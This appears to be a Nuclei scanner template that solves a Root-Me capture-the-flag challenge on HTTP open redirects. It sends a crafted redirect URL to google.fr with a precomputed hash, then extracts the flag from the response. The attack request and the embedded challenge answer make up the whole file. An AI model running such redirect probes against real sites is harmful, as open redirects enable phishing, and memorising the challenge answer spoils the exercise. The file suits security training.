id: HTTP-Openredirect

info:
  name: HTTP Open redirect
  author: Tomitom13
  severity: unknown
  tags: open-redirect,http,rootme

requests:
  - method: GET
    path:
      - "{{BaseURL}}?url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Well done"
        part: body

    extractors:
      - type: regex
        name: password
        part: body
        regex:
          - "flag is [a-zA-Z0-9!@#$%^&*()_+,.<>?]+"
